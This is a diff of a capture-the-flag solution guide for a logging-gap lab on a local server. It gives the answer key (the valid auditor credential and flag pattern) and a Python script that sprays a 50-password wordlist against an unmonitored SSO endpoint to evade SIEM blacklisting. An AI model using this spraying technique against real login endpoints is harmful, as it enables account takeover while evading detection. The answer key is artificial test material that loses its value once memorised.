@@ -1,30 +1,45 @@
 # A09 Easy: Solution Guide
 
 ### Vulnerability Analysis
-1. Browse to `/compliance` to discover auditor username `sec_auditor` and password `Auditor2026!`.
-2. Notice in `/siem/monitor` that attempts on `/login` are strictly tracked, and 3 failed attempts will blacklist the attacker IP.
-3. Inspect `/api/v1/docs` to discover the unlogged legacy endpoint:
-   - `POST /api/v1/sso/partner-auth`
-4. The partner authentication endpoint validates credentials without generating any entries in `SIEM_EVENTS` or updating failure counters.
-5. Authenticate via `/api/v1/sso/partner-auth`, then navigate to `/auditor/vault` to obtain the dynamic flag.
+1. Browse to `/compliance` to discover the external auditor account `sec_auditor` and the 50 approved candidate rotation keys (available at `/compliance/candidates.txt`).
+2. Reviewing `/login` reveals that external auditor accounts are prohibited from the web form, and any 3 failed attempts result in an automatic SIEM IP blacklist.
+3. Checking `/robots.txt` reveals the OpenAPI documentation (`/api/v1/docs`), the target vault (`/auditor/vault`), and the partner SSO gateway (`/api/v1/sso/`).
+4. Inspecting `/api/v1/sso/partner-auth` reveals a critical logging and alerting gap: failed authentication attempts on the partner SSO endpoint do NOT stream to the SIEM and enforce zero rate limiting or blacklisting.
+5. An attacker can spray the 50 candidate passwords from `/compliance/candidates.txt` against `/api/v1/sso/partner-auth`. The valid credential is candidate #25 (`ComplianceAuditor2026!`).
+6. Once authenticated via SSO, the session cookie grants access to `/auditor/vault` to claim the dynamic flag.
+
+---
 
 ### Exploit Script
 ```python
-import requests
 import re
+import requests
 
 BASE_URL = "http://127.0.0.1:6025"
-s = requests.Session()
+session = requests.Session()
 
-# Authenticate via unlogged partner endpoint
-resp = s.post(f"{BASE_URL}/api/v1/sso/partner-auth", json={
-    "username": "sec_auditor",
-    "password": "Auditor2026!"
-})
-assert resp.json().get("success") is True
+# 1. Download the 50 candidate keys from compliance
+wordlist_resp = session.get(f"{BASE_URL}/compliance/candidates.txt")
+candidates = [line.strip() for line in wordlist_resp.text.strip().splitlines() if line.strip()]
+print(f"[*] Loaded {len(candidates)} candidates from compliance wordlist.")
 
-# Retrieve flag from vault
-vault_resp = s.get(f"{BASE_URL}/auditor/vault")
+# 2. Spray candidates against the unmonitored partner SSO endpoint
+authenticated = False
+for idx, pwd in enumerate(candidates, 1):
+    resp = session.post(f"{BASE_URL}/api/v1/sso/partner-auth", json={
+        "username": "sec_auditor",
+        "password": pwd
+    })
+    data = resp.json()
+    if data.get("success"):
+        print(f"[+] Successfully authenticated on candidate #{idx}: {pwd}")
+        authenticated = True
+        break
+
+assert authenticated, "Failed to authenticate with candidate pool"
+
+# 3. Retrieve flag from auditor vault
+vault_resp = session.get(f"{BASE_URL}/auditor/vault")
 flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
 print(f"[+] Dynamic Flag: {flag}")
 ```
